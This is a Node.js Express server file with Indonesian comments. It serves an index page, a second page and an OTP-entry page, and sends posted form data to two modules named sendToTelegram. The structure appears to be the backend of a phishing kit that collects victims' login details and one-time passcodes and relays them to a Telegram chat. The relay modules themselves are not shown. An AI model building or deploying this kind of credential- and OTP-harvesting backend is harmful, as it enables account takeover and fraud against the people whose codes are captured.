const express = require("express");
const cors = require("cors");
const path = require("path");
const sendToTelegram = require("./1"); // Import file 1.js
const sendToTelegram2 = require("./otp"); // Import file otp.js

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.resolve(__dirname, 'public')));


app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/one", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "one.html"));
});

app.get("/otp", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "otp.html"));
});

// Gunakan route API dari 1.js
app.use("/api/send", sendToTelegram);

// Gunakan route API dari otp.js
app.use("/api/send2", sendToTelegram2);

app.listen(PORT, () => {
    console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
});

module.exports = app;
